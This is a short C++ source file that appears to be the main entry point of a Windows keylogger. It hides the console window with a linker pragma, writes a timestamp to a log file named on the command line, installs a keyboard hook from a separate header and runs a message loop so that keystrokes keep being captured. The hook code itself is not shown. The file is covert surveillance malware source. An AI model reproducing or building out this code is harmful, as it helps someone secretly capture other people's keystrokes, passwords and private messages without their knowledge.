#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")

#include <iostream>
#include <Windows.h>
#include "KeyConstants.h"
#include "Helper.h"
#include "KeybHooks.h"
#include "Globals.h"

int main(int argc, char* argv[]) {

	MSG Msg;

	if (argc == 2)
	{
		GlobalResources::LOGFILE_NAME = argv[1];

		std::cout << GlobalResources::LOGFILE_NAME << std::endl;
		std::ofstream file(GlobalResources::LOGFILE_NAME, std::ios::app);
		file << Helper::DateTime().GetDateTimeString() << "\n";
		file.close();
		KeyHooks::installHook();
		while (GetMessage(&Msg, NULL, 0, 0)) {
			TranslateMessage(&Msg);
			DispatchMessage(&Msg);
		}
	}
	//system("PAUSE");
	return 0;
}